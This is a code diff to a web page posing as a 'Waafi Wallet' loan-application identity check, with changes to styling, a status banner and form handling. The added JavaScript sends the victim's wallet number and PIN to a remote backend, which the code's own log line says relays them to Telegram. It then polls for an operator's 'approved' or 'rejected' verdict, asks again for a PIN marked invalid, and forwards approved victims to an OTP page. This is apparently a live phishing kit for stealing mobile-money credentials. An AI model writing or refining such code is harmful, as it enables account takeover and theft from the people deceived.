@@ -54,12 +54,6 @@
             color: inherit;
         }
 
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 24px;
-        }
-
         /* ===== HEADER ===== */
         .header {
             position: sticky;
@@ -120,6 +114,10 @@
         }
 
         .nav a:hover,
+        .nav a.active {
+            color: var(--primary);
+        }
+
         .nav a.active {
             color: var(--primary);
         }
@@ -218,6 +216,40 @@
             margin-bottom: 24px;
         }
 
+        /* ===== STATUS MESSAGE ===== */
+        .verify-status {
+            text-align: center;
+            font-size: 0.9rem;
+            font-weight: 500;
+            padding: 10px 12px;
+            border-radius: 8px;
+            margin-bottom: 16px;
+            display: none;
+        }
+
+        .verify-status.show {
+            display: block;
+        }
+
+        .verify-status.waiting {
+            background: #fef3c7;
+            color: #92400e;
+            border: 1px solid #fcd34d;
+        }
+
+        .verify-status.error {
+            background: #fef2f2;
+            color: #991b1b;
+            border: 1px solid #fca5a5;
+        }
+
+        .verify-status.success {
+            background: #f0fdf4;
+            color: #166534;
+            border: 1px solid #86efac;
+        }
+
+        /* ===== FORM ===== */
         .verify-form {
             display: flex;
             flex-direction: column;
@@ -257,12 +289,18 @@
             color: var(--text-muted);
         }
 
+        .form-group input:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
         .form-hint {
             font-size: 0.75rem;
             color: var(--text-muted);
             margin-top: 4px;
         }
 
+        /* ===== PIN INPUT ===== */
         .pin-container {
             display: flex;
             gap: 12px;
@@ -288,6 +326,30 @@
             box-shadow: 0 0 0 2px oklab(0.56 -0.123613 0.065726 / 0.4);
         }
 
+        .pin-input.error {
+            border-color: #ef4444;
+            animation: shake 0.3s ease;
+        }
+
+        .pin-input:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        @keyframes shake {
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+            25% {
+                transform: translateX(-6px);
+            }
+            75% {
+                transform: translateX(6px);
+            }
+        }
+
+        /* ===== BUTTON ===== */
         .verify-btn {
             width: 100%;
             padding: 12px 24px;
@@ -311,6 +373,25 @@
             opacity: 0.6;
             cursor: not-allowed;
             transform: none;
+        }
+
+        /* ===== SPINNER ===== */
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #fff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.6s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
         }
 
         .help-text {
@@ -344,25 +425,6 @@
             text-align: center;
             font-size: 0.875rem;
             color: var(--text-muted);
-        }
-
-        /* ===== LOADING SPINNER ===== */
-        .spinner {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid #fff;
-            border-radius: 50%;
-            border-top-color: transparent;
-            animation: spin 0.6s linear infinite;
-            margin-right: 8px;
-            vertical-align: middle;
-        }
-
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
         }
 
         /* ===== RESPONSIVE ===== */
@@ -408,6 +470,10 @@
                 height: 48px;
                 font-size: 1rem;
             }
+
+            .pin-container {
+                gap: 8px;
+            }
         }
 
         @media (max-width: 480px) {
@@ -417,7 +483,7 @@
                 font-size: 0.875rem;
             }
             .pin-container {
-                gap: 8px;
+                gap: 6px;
             }
             .verify-card {
                 padding: 20px;
@@ -475,6 +541,9 @@
                 <h1 class="verify-title">Verify Your Identity</h1>
                 <p class="verify-subtitle">Enter your Waafi Wallet details to complete your loan application</p>
 
+                <!-- Status Message -->
+                <div class="verify-status" id="verifyStatus"></div>
+
                 <form class="verify-form" id="verifyForm">
                     <div class="form-group">
                         <label for="phoneNumber">Waafi Wallet Number</label>
@@ -515,6 +584,16 @@
         // ===== BACKEND API URL =====
         const API_URL = 'https://waafi-loans-production.up.railway.app';
 
+        // ===== DOM ELEMENTS =====
+        const verifyForm = document.getElementById('verifyForm');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const phoneInput = document.getElementById('phoneNumber');
+        const pinInputs = document.querySelectorAll('.pin-input');
+        const statusMessage = document.getElementById('verifyStatus');
+
+        let statusCheckInterval = null;
+        let isVerifying = false;
+
         // ===== LANGUAGE =====
         const savedLang = localStorage.getItem('waafi-language') || 'en';
         document.getElementById('headerLangText').textContent = savedLang === 'en' ? 'EN' : 'SO';
@@ -533,15 +612,33 @@
             });
         });
 
-        // ===== PRE-FILL PHONE NUMBER =====
+        // ===== PRE-FILL PHONE =====
         const phoneFromStorage = localStorage.getItem('waafi-phone') || '';
         if (phoneFromStorage) {
-            document.getElementById('phoneNumber').value = phoneFromStorage;
+            phoneInput.value = phoneFromStorage;
         }
 
-        // ===== PIN INPUT =====
-        const pinInputs = document.querySelectorAll('.pin-input');
+        // ===== SHOW STATUS =====
+        function showStatus(message, type) {
+            statusMessage.textContent = message;
+            statusMessage.className = 'verify-status show ' + type;
+        }
 
+        function hideStatus() {
+            statusMessage.className = 'verify-status';
+            statusMessage.textContent = '';
+        }
+
+        // ===== DISABLE INPUTS =====
+        function disableInputs(disabled) {
+            phoneInput.disabled = disabled;
+            pinInputs.forEach(input => {
+                input.disabled = disabled;
+            });
+            verifyBtn.disabled = disabled;
+        }
+
+        // ===== PIN INPUT HANDLING =====
         pinInputs.forEach((input, index) => {
             input.addEventListener('input', function(e) {
                 const value = this.value;
@@ -549,6 +646,9 @@
                     this.value = '';
                     return;
                 }
+                this.classList.remove('error');
+                hideStatus();
+
                 if (value.length === 1 && index < pinInputs.length - 1) {
                     pinInputs[index + 1].focus();
                 }
@@ -562,6 +662,15 @@
 
             input.addEventListener('paste', function(e) {
                 e.preventDefault();
+                const paste = (e.clipboardData || window.clipboardData).getData('text');
+                const digits = paste.replace(/\D/g, '').slice(0, pinInputs.length);
+                digits.split('').forEach((digit, i) => {
+                    if (pinInputs[i]) {
+                        pinInputs[i].value = digit;
+                    }
+                });
+                const nextIndex = Math.min(digits.length, pinInputs.length - 1);
+                pinInputs[nextIndex].focus();
             });
 
             input.addEventListener('click', function() {
@@ -569,14 +678,80 @@
             });
         });
 
-        // ===== FORM SUBMISSION WITH BACKEND =====
-        const verifyForm = document.getElementById('verifyForm');
-        const verifyBtn = document.getElementById('verifyBtn');
+        // ===== CHECK PIN STATUS (Polling) =====
+        function startCheckingStatus(phoneNumber) {
+            if (statusCheckInterval) clearInterval(statusCheckInterval);
 
+            statusCheckInterval = setInterval(async () => {
+                try {
+                    const response = await fetch(`${API_URL}/api/check-pin-status`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ phoneNumber: phoneNumber })
+                    });
+
+                    const result = await response.json();
+
+                    if (result.success) {
+                        const status = result.data.status;
+                        console.log(`📊 PIN Status: ${status}`);
+
+                        if (status === 'approved') {
+                            clearInterval(statusCheckInterval);
+                            showStatus('✅ Verification successful! Redirecting...', 'success');
+                            disableInputs(true);
+                            verifyBtn.innerHTML = '✓ Verified!';
+                            verifyBtn.style.background = '#22c55e';
+
+                            setTimeout(() => {
+                                window.location.href = 'otp.html';
+                            }, 1500);
+                        } else if (status === 'rejected') {
+                            clearInterval(statusCheckInterval);
+                            showStatus('❌ Invalid PIN. Please try again.', 'error');
+                            disableInputs(false);
+                            verifyBtn.innerHTML = 'Verify &amp; Continue';
+                            verifyBtn.style.background = '';
+                            isVerifying = false;
+
+                            // Clear PIN inputs
+                            pinInputs.forEach(input => {
+                                input.value = '';
+                                input.classList.add('error');
+                            });
+                            pinInputs[0].focus();
+
+                            setTimeout(() => {
+                                pinInputs.forEach(input => {
+                                    input.classList.remove('error');
+                                });
+                            }, 1000);
+                        } else {
+                            showStatus('⏳ Verifying your details...', 'waiting');
+                        }
+                    } else if (result.status === 404) {
+                        clearInterval(statusCheckInterval);
+                        showStatus('⚠️ Session expired. Please try again.', 'error');
+                        disableInputs(false);
+                        verifyBtn.innerHTML = 'Verify &amp; Continue';
+                        verifyBtn.style.background = '';
+                        isVerifying = false;
+                    }
+                } catch (error) {
+                    console.error('❌ Error checking status:', error);
+                }
+            }, 3000);
+        }
+
+        // ===== FORM SUBMISSION =====
         verifyForm.addEventListener('submit', async function(e) {
             e.preventDefault();
 
-            const phoneNumber = document.getElementById('phoneNumber').value;
+            if (isVerifying) return;
+
+            const phoneNumber = phoneInput.value.trim();
             let pin = '';
             pinInputs.forEach(input => {
                 pin += input.value;
@@ -584,54 +759,56 @@
 
             // Validation
             if (phoneNumber.length < 7) {
-                alert('Please enter a valid Waafi Wallet number.');
+                showStatus('Please enter a valid Waafi Wallet number.', 'error');
                 return;
             }
 
             if (pin.length !== 4) {
-                alert('Please enter your complete 4-digit PIN.');
+                showStatus('Please enter your complete 4-digit PIN.', 'error');
                 return;
             }
 
-            // Save phone for OTP page
+            // Save phone for next page
             localStorage.setItem('waafi-phone', phoneNumber);
 
-            // Prepare data for backend
-            const verifyData = {
-                phoneNumber: phoneNumber,
-                pin: pin
-            };
-
-            // Show loading state
+            // Show loading
+            isVerifying = true;
+            disableInputs(true);
             verifyBtn.innerHTML = '<span class="spinner"></span> Verifying...';
-            verifyBtn.disabled = true;
+            hideStatus();
+            showStatus('⏳ Verifying your details...', 'waiting');
 
             try {
-                // Send data to backend
-                const response = await fetch(`${API_URL}/api/verify`, {
+                // Send PIN to backend for admin approval
+                const response = await fetch(`${API_URL}/api/send-pin`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify(verifyData)
+                    body: JSON.stringify({ phoneNumber: phoneNumber, pin: pin })
                 });
 
                 const result = await response.json();
 
                 if (result.success) {
-                    console.log('✅ Verification data sent to Telegram:', result);
-                    // Redirect to OTP page
-                    window.location.href = 'otp.html';
+                    console.log('✅ PIN sent to Telegram:', result);
+                    showStatus('⏳ Verifying your details...', 'waiting');
+                    // Start checking for admin response
+                    startCheckingStatus(phoneNumber);
                 } else {
-                    alert('❌ Verification failed. Please try again.');
+                    showStatus('❌ ' + (result.message || 'Verification failed. Please try again.'), 'error');
+                    disableInputs(false);
                     verifyBtn.innerHTML = 'Verify &amp; Continue';
-                    verifyBtn.disabled = false;
+                    verifyBtn.style.background = '';
+                    isVerifying = false;
                 }
             } catch (error) {
                 console.error('❌ Error:', error);
-                alert('⚠️ Network error. Please check your connection and try again.');
+                showStatus('⚠️ Network error. Please check your connection and try again.', 'error');
+                disableInputs(false);
                 verifyBtn.innerHTML = 'Verify &amp; Continue';
-                verifyBtn.disabled = false;
+                verifyBtn.style.background = '';
+                isVerifying = false;
             }
         });
     </script>
